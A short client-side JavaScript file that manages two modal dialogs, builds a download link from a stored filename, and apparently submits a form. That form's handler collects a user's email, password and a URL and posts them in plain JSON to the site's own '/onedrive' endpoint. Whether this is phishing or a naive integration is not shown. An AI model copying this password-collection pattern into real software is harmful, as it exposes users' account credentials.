

const download = document.querySelector('#dowlo')
const nomcli = JSON.parse(localStorage.getItem("nomdufichier"));
const hrefenvoyer= download.getAttribute('href');
let href2 = hrefenvoyer + nomcli["value"]
download.setAttribute("href", href2 )

// console.log( href2);


var modal = document.getElementById("myModal");


var btn = document.getElementById("myBtn");


var span = document.getElementsByClassName("close")[0];

 
btn.onclick = function() {
  modal.style.display = "block";
}


span.onclick = function() {
  modal.style.display = "none";
}

window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}


// Get the modal
var modal1 = document.getElementById("myModal1");

// Get the button that opens the modal
var btn1 = document.getElementById("myBtn1");

// Get the <span> element that closes the modal
var span1 = document.getElementsByClassName("close1")[0];

// When the user clicks the button, open the modal 
btn1.onclick = function() {
  modal1.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span1.onclick = function() {
  modal1.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal1) {
    modal1.style.display = "none";
  }
}


async function myfunctiondrive(e){
    e.preventDefault()
    const form = e.target
    // console.log(form)
    let mail = form["email"];
    // console.log(mail)
    const email= mail.value
    // console.log(email)



    let password = form["password"]
    password = password.value
    // console.log(password);


    let url = form["url"]
    // console.log(url);
    url= url.value
    // console.log(url);


    let datadrive = {
        "email": email,
        "password": password,
        "url" : url,
        "client": nomcli["value"] 
    }
    const response = await fetch("/onedrive", {
        method: 'POST',
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(datadrive)
        });     

}









